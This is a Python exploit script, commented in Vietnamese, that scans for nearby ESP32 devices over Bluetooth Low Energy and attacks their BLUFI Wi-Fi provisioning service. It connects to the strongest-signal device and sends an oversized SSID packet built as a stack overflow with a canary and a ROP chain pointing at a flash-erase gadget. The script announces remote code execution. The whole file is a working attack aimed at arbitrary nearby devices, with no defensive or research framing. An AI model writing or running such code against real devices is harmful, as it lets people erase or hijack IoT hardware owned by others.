import asyncio
from bleak import BleakClient, BleakScanner
from bleak.backends.scanner import AdvertisementData
from bleak.exc import BleakDeviceNotFoundError, BleakError
import struct

# UUID của các đặc trưng BLE để ghi dữ liệu và nhận thông báo
VARIANT_WRITE_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"  # UUID ghi dữ liệu (phiên bản biến thể)
STANDARD_WRITE_UUID = "0000fff1-0000-1000-8000-00805f9b34fb"  # UUID ghi dữ liệu (phiên bản tiêu chuẩn)
VARIANT_NOTIFY_UUID = "0000ff02-0000-1000-8000-00805f9b34fb"  # UUID nhận thông báo từ thiết bị

# Cấu hình ROP Payload (Return-Oriented Programming) để khai thác lỗi tràn bộ nhớ
OFFSET_TO_CANARY = 144  # Vị trí của giá trị canary trong stack (cần điều chỉnh từ GDB)
OFFSET_TO_RA = 148      # Vị trí địa chỉ trả về (Return Address) trong stack
CANARY = struct.pack('<I', 0xDEADBEEF)  # Giá trị canary để phát hiện tràn bộ nhớ
NVS_ERASE_GADGET = 0x400d970d  # Địa chỉ gadget ROP (từ backtrace blufi_security_deinit)
ROP_CHAIN = struct.pack('<I', NVS_ERASE_GADGET) + b'\x90\x90\x90\x90'  # Chuỗi ROP + các lệnh NOP
# Tạo payload tràn bộ nhớ SSID: điền dữ liệu đến vị trí canary, rồi tới RA, rồi ROP chain
SSID_OVERFLOW = b'A' * OFFSET_TO_CANARY + CANARY + b'\x00' * (OFFSET_TO_RA - OFFSET_TO_CANARY - 4) + ROP_CHAIN + b'B' * (200 - OFFSET_TO_RA)

async def scan_for_esp32(timeout=10.0):
    """
    Quét để tìm thiết bị ESP32 qua BLE.
    
    Args:
        timeout: Thời gian quét (giây)
    
    Returns:
        Địa chỉ MAC của thiết bị ESP32 tốt nhất (signal mạnh nhất), hoặc None nếu không tìm thấy
    """
    devices = []

    def detection_callback(device, advertisement_data: AdvertisementData):
        # Callback được gọi khi phát hiện một thiết bị BLE
        name = advertisement_data.local_name or "Unknown"  # Lấy tên thiết bị
        # Kiểm tra nếu tên chứa các từ khóa liên quan ESP32/BLUFI
        if any(keyword in name.upper() for keyword in ["ESP", "BLUFI", "ESP32", "BLYNK"]):
            devices.append((device.address, name, advertisement_data.rssi))  # Lưu địa chỉ, tên, độ mạnh signal
            print(f"Found: {device.address} | {name} | RSSI: {advertisement_data.rssi}")

    print("Scanning...")
    scanner = BleakScanner(detection_callback)  # Khởi tạo BLE scanner
    await scanner.start()  # Bắt đầu quét
    await asyncio.sleep(timeout)  # Quét trong thời gian chỉ định
    await scanner.stop()  # Dừng quét

    if not devices:
        return None
    # Chọn thiết bị có signal mạnh nhất (RSSI cao nhất)
    best = max(devices, key=lambda x: x[2])
    print(f"Target: {best[0]} | {best[1]} | RSSI: {best[2]}")
    return best[0]

async def send_blufi_packet(client: BleakClient, write_uuid: str, type_byte: int, seq: int, data: bytes):
    """
    Gửi một gói dữ liệu BLUFI tới ESP32.
    
    Args:
        client: Kết nối BLE tới thiết bị
        write_uuid: UUID của đặc trưng để ghi dữ liệu
        type_byte: Loại gói (0x08=STA mode, 0x09=SSID, v.v.)
        seq: Số hiệu tuần tự của gói
        data: Dữ liệu payload (tối đa 255 byte)
    
    Returns:
        True nếu gửi thành công, False nếu thất bại
    """
    frame_ctrl = 0x00  # Cờ điều khiển khung (không sử dụng trong trường hợp này)
    data_len = len(data)  # Độ dài dữ liệu
    if data_len > 255:
        print("⚠ >255: Skip.")  # Kiểm tra giới hạn 1 byte độ dài
        return False
    # Tạo header: loại gói + cờ + số hiệu + độ dài dữ liệu
    header = bytes([type_byte, frame_ctrl, seq, data_len])
    packet = header + data  # Kết hợp header và dữ liệu
    try:
        # Gửi gói qua BLE (response=False: không chờ xác nhận)
        await client.write_gatt_char(write_uuid, packet, response=False)
        print(f"✓ Sent: type=0x{type_byte:02x}, seq=0x{seq:02x}, len={data_len}, payload={data[:32].hex()}...")
        return True
    except BleakError as e:
        print(f"✗ Failed: {e}")
        return False

async def notification_handler(sender, data):
    """
    Xử lý thông báo (dữ liệu) nhận được từ thiết bị ESP32.
    
    Args:
        sender: UUID của đặc trưng gửi thông báo
        data: Dữ liệu nhận được (dạng bytes)
    """
    print(f"Response: {data.hex()}")  # In dữ liệu phản hồi dưới dạng hex

async def main():
    """
    Hàm chính: quét ESP32, kết nối, và thực hiện khai thác lỗi tràn bộ nhớ.
    """
    # Bước 1: Quét và tìm thiết bị ESP32
    target_addr = await scan_for_esp32(timeout=15.0)
    if not target_addr:
        return
    
    client = BleakClient(target_addr)
    connected = False
    try:
        # Bước 2: Kết nối tới thiết bị
        await client.connect(timeout=10.0)
        print(f"✓ Connected to {target_addr}")
        connected = True
        
        await asyncio.sleep(2.0)  # Chờ thiết bị sẵn sàng
        
        # Bước 3: Phát hiện các dịch vụ và đặc trưng BLE
        services = client.services
        print("✓ Discovered")
        
        # Lấy danh sách UUID có khả năng ghi và nhận thông báo
        write_chars = [char.uuid for service in services for char in service.characteristics if 'write' in char.properties]
        notify_chars = [char.uuid for service in services for char in service.characteristics if 'notify' in char.properties]
        
        # Bước 4: Chọn UUID ghi phù hợp (ưu tiên phiên bản biến thể)
        if VARIANT_WRITE_UUID in write_chars:
            write_uuid = VARIANT_WRITE_UUID
        elif STANDARD_WRITE_UUID in write_chars:
            write_uuid = STANDARD_WRITE_UUID
        else:
            write_uuid = write_chars[0] if write_chars else None
            if not write_uuid:
                raise Exception("No write char")
        
        print(f"Using write UUID: {write_uuid}")
        
        # Bước 5: Bật thông báo nếu UUID tồn tại
        notify_uuid = VARIANT_NOTIFY_UUID if VARIANT_NOTIFY_UUID in notify_chars else None
        if notify_uuid:
            await client.start_notify(notify_uuid, notification_handler)
            print("✓ Notify on")
        
        seq = 0  # Số hiệu tuần tự cho các gói
        
        # Bước 6: Gửi lệnh chuyển sang chế độ STA (Station Mode)
        opmode_type = 0x08  # Loại gói: chế độ hoạt động
        await send_blufi_packet(client, write_uuid, opmode_type, seq, b'\x01')
        seq += 1
        await asyncio.sleep(0.5)
        
        # Bước 7: Gửi payload khai thác - SSID với tràn bộ nhớ và ROP chain
        # Lỗi: hàm strncpy không kiểm tra giới hạn buffer
        ssid_type = 0x09  # Loại gói: SSID WiFi
        await send_blufi_packet(client, write_uuid, ssid_type, seq, SSID_OVERFLOW)
        print("✓ WXR SSID ROP payload sent - Expect 'Recv STA SSID AAAA...' + corrupt + ROP execute")
        
        print("Exploit complete. Monitor for overflow effects (authmode invalid, ROP RCE).")
        await asyncio.sleep(20)  # Chờ để quan sát tác động của khai thác
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Dọn dẹp: tắt thông báo và ngắt kết nối
        if connected and client.is_connected:
            if 'notify_uuid' in locals() and notify_uuid:
                try:
                    await client.stop_notify(notify_uuid)
                except:
                    pass
            await client.disconnect()
            print("Disconnected.")

if __name__ == "__main__":
    asyncio.run(main())